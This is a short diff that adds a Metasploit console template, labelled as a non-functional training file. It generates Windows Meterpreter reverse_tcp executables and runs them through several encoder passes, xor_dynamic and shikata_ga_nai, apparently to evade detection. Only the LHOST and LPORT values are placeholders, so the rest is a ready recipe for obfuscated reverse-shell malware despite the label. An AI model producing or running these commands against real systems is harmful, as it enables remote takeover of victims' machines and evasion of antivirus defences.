@@ -1,0 +1,16 @@
+# Encoding Chains Template
+# For Training Use – Non-functional Template
+
+use payload/windows/x64/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set ENCODER x64/xor_dynamic
+set ITERATIONS 5
+generate -f exe -o /tmp/encoded1.exe
+
+use encoder/x86/shikata_ga_nai
+set payload windows/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set iterations 10
+generate -f exe -o /tmp/encoded2.exe
